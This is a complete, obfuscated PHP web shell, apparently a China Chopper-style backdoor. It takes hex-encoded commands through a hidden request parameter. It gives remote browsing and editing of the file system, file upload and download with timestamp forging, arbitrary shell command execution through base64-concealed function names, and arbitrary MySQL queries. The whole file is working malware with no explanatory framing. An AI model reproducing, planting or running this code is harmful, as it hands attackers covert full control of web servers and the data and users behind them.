<?php function P($s){return bin2hex($s);}function Q($s){return pack("H*",$s);}function I0(){$a="";$b="\n";$a.="1:".$_SERVER['SERVER_NAME']." - (".@gethostbyname($_SERVER['SERVER_NAME']).")".$b;$a.="2:".@getenv('COMPUTERNAME').$b;$a.="3:".@php_uname().$b;$a.="4:".@getenv("SYSTEMROOT").$b;$a.="5:".@date('Y-m-d h:i:s').$b;$a.="6:".$_SERVER['SERVER_SOFTWARE'].$b;$a.="7:".PHP_VERSION.$b;$a.="10:".@get_current_user().$b;$a.="12:".$_SERVER['DOCUMENT_ROOT'].$b;$a.="13:".$_SERVER['SCRIPT_FILENAME'].$b;return $a;}Function A1($I){if(!is_dir($I)){return "ER2";}if(!($D=@opendir($I))){return "ER1";}$N="null";$T="\t";$M="";$L="";while($F=@readdir($D)){if($F!="."&&$F!=".."){$P=$I."/".$F;$S=@filemtime($P);$FT=$T.(empty($S)?$N:@date("Y-m-d H:i:s",$S));$S=@fileperms($P);$FP=$T.(empty($S)?$N:$S)."\n";if(is_dir($P)){$M.=$F."/".$FT.$T."0".$FP;}else{$S=@filesize($P);$FS=$T.(@is_numeric($S)?$S:$N);$L.=$F.$FT.$FS.$FP;}}}@closedir($D);return $M.$L;}Function A2($I){if(file_exists($I)){return "ER3";}if(!@mkdir($I)){return "ER1";}return "OK";}Function A3($I){if(!is_dir($I)){return "ER2";}$D=@opendir($I);if(!$D){return "ER1";}while($F=@readdir($D)){if($F!="."&&$F!=".."){$file=$I."/".$F;if(is_dir($file)){A3($file);}else{@unlink($file);			}}}@closedir($D);if(!@rmdir($I)){return "ER1";}return "OK";}Function A4($I1,$I2){if(!is_dir($I1)){return "ER2";}if (!@rename($I1,$I2)){return "ER1";}   return "OK";}Function A5($I1,$I2){if(!is_dir($I1)){return "ER2";}if(!is_dir($I2)&&!@mkdir($I2)){return "ER1";}$D=@opendir($I1);if(!$D){return "ER1";}while($F=@readdir($D)){if($F!="."&&$F!=".."){$F1=$I1."/".$F;$F2=$I2."/".$F;if(is_dir($F1)){A5($F1,$F2);}else{@copy($F1,$F2);}}}@closedir($D);return "OK";}Function A6(){$D=dirname(__FILE__);$R="";if(DIRECTORY_SEPARATOR!='\\'){return "/";}if(substr($D,0,1)!="/"){foreach(range("A","Z") as $L){if(is_dir("{$L}:")){$R.="{$L}:";}}}return $R;}Function B1($I){if(!file_exists($I)){return "ER4";}$F=@fopen($I,"r");if (!$F){return "ER1";}$D=@fread($F,@filesize($I));@fclose($F);return $D;}Function B2($I1,$I2){$F=@fopen($I1,"wb");if(!$F){return "ER1";}if(!@fwrite($F,$I2)){@fclose($F);return "ER1";}@fclose($F);return "OK";}Function B3($I){if(!is_file($I)){return "ER4";}if(!@unlink($I)){return "ER1";}return "OK";}Function B4($I1,$I2){if(!is_file($I1)){return "ER4";}if (!@rename($I1,$I2)){return "ER1";}   return "OK";}Function B5($I1,$I2){if(!is_file($I1)){return "ER4";}if(!@copy($I1,$I2)){return "ER1";}return "OK";}function B6($I){@ob_clean();if(!is_file($I)){echo "File not found";return;}$F=@fopen($I,"rb");if(!$F){echo "Access denied";return;}echo '12345678'.@filesize($I).':';while(!@feof($F)){$b=@fread($F,204800);echo $b;@ob_flush();@flush();}@fclose($F);}Function B7($I1,$I2,$I3){$F=null;$D="";if($I3>0){$F=@fopen($I1,"ab");}else{$F=@fopen($I1,"wb");@fseek($F,$I3);}for($i=0;$i<strlen($I2);$i+=2){$D.=@urldecode("%".substr($I2,$i,2));}$O=@fwrite($F,$D)?"OK":"ER1";@fclose($F);return $O;}Function B8($I1,$I2){$T=@strtotime($I2);if(!file_exists($I1)){return "ER4";}if(!@touch($I1,$T,$T)){return "ER1";}return "OK";}function C1($I,$J){$e=explode(',',base64_decode('ZnVuY3Rpb25fZXhpc3RzLHNoZWxsX2V4ZWMsc3lzdGVtLGV4ZWMscGFzc3RocnUscG9wZW4scHJvY19vcGVu'));$r='';$f=$e[0];if($f($e[6])){$d=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));$p=@$e[6]($I,$d,$i);if(@is_resource($p)){@fwrite($i[0],"$I\r\n");while(!feof($i[1])){$r.=fgets($i[1]);}@fclose($i[1]);while(!feof($i[2])){$r.=fgets($i[2]);}@fclose($i[2]);@proc_close($p);}}elseif($f($e[1])){$r=@$e[1]($I);}elseif($f($e[2])){@ob_start();@$e[2]($I);$r=@ob_get_contents();@ob_end_clean();}elseif($f($e[3])){@$e[3]($I,$r);$r=@join("\n",$r);}elseif($f($e[4])){@ob_start();@$e[4]($I);$r=@ob_get_contents();@ob_end_clean();}elseif($f($e[5])&&@is_resource($p=@$e[5]($I,'r'))){while(!@feof($p)){$r.=@fread($p,2048);}@pclose($p);}else{$r="ER11";}$r=empty($r)?"ER13":$r;return $r;}Function D1($I){$A=explode('||',$I);$Z=count($A);if ($Z<3){return "ER7";}if(!function_exists("mysql_connect")){return "ER11";}$B=@mysql_connect($A[0],$A[1],$A[2]);if(!$B){return "ER8";}if($Z>3){@mysql_query("SET NAMES ".$A[3]);}$C=@mysql_query("SHOW DATABASES");$O="";while($D=@mysql_fetch_row($C)){$O.=trim($D[0]).chr(9);}@mysql_close($B);return $O;}Function D2($I1,$I2){$A=explode('||',$I1);$Z=count($A);if($Z<3){return "ER7";}if(!function_exists("mysql_connect")){return "ER11";}$B=@mysql_connect($A[0],$A[1],$A[2]);if(!$B){return "ER8";}if($Z>3){@mysql_query("SET NAMES ".$A[3]);}$C=@mysql_query("SHOW TABLES FROM `{$I2}`");$O="";while($D=@mysql_fetch_row($C)){$O.=trim($D[0]).chr(9);}@mysql_close($B);return $O;}Function D3($I1,$I2,$I3){$A=explode('||',$I1);$Z=count($A);if ($Z<3){return "ER7";}if(!function_exists("mysql_connect")){return "ER11";}$B=@mysql_connect($A[0],$A[1],$A[2]);if(!$B){return "ER8";}if($Z>3){@mysql_query("SET NAMES ".$A[3]);}if(!@mysql_select_db($I2)){@mysql_close($B);return "ER9";}$C=@mysql_query("SHOW COLUMNS FROM `{$I3}`");$O="";while($D=@mysql_fetch_row($C)){$O.=trim($D[0])." (".$D[1].")".chr(9);}@mysql_close($B);return $O;}Function D4($I1,$I2,$I3){$A=explode('||',$I1);$Z=count($A);if ($Z<3){return "ER7";}if(!function_exists("mysql_connect")){return "ER11";}$B=@mysql_connect($A[0],$A[1],$A[2]);if(!$B){return "ER8";}if($Z>3){@mysql_query("SET NAMES ".$A[3]);}if(!@mysql_select_db($I2)){@mysql_close($B);return "ER9";}$C=@mysql_query($I3);if(!$C){$D=@mysql_error();@mysql_close($B);return "ER:".$D;		}$D=@mysql_num_fields($C);if(!$D){@mysql_close($B);return "OK";}$O="";for($i=0;$i<$D;$i++){$O.=@mysql_field_name($C,$i)."\t|\t";}$O.="\n";while($E=@mysql_fetch_row($C)){for($i=0;$i<$D;$i++){$O.=$E[$i]."\t|\t";}$O.="\n";}@mysql_close($B);return $O;}?><?php @set_time_limit(0);@ini_set("display_errors","0");ob_clean();$q=$_REQUEST['yfufyudtrdyghgj'];$q=Q($q);$p=explode(':',$q);if(count($p)!=6){exit;}$p1=$_REQUEST[$p[1]];$p2=$_REQUEST[$p[2]];$p3=$_REQUEST[$p[3]];$R='';if($p[0]==='I0'){$R=I0();}else if($p[0]==='A1'){$R=A1(Q($p1));}else if($p[0]==='A2'){$R=A2(Q($p1));}else if($p[0]==='A3'){$R=A3(Q($p1));}else if($p[0]==='A4'){$R=A4(Q($p1),Q($p2));}else if($p[0]==='A5'){$R=A5(Q($p1),Q($p2));}else if($p[0]==='A6'){$R=A6();}else if($p[0]==='B1'){$R=B1(Q($p1));}else if($p[0]==='B2'){$R=B2(Q($p1),Q($p2));}else if($p[0]==='B3'){$R=B3(Q($p1));}else if($p[0]==='B4'){$R=B4(Q($p1),Q($p2));}else if($p[0]==='B5'){$R=B5(Q($p1),Q($p2));}else if($p[0]==='B6'){B6(Q($p1));exit;}else if($p[0]==='B7'){$R=B7(Q($p1),$p2,Q($p3));}else if($p[0]==='B8'){$R=B8(Q($p1),Q($p2),Q($p3));}else if($p[0]==='C1'){$R=C1(Q($p1),Q($p2));}else if($p[0]==='D1'){$R=D1(Q($p1));}else if($p[0]==='D2'){$R=D2(Q($p1),Q($p2));}else if($p[0]==='D3'){$R=D3(Q($p1),Q($p2),Q($p3));}else if($p[0]==='D4'){$R=D4(Q($p1),Q($p2),Q($p3));}else{$R='';}echo $p[4].$R.$p[5];exit;?>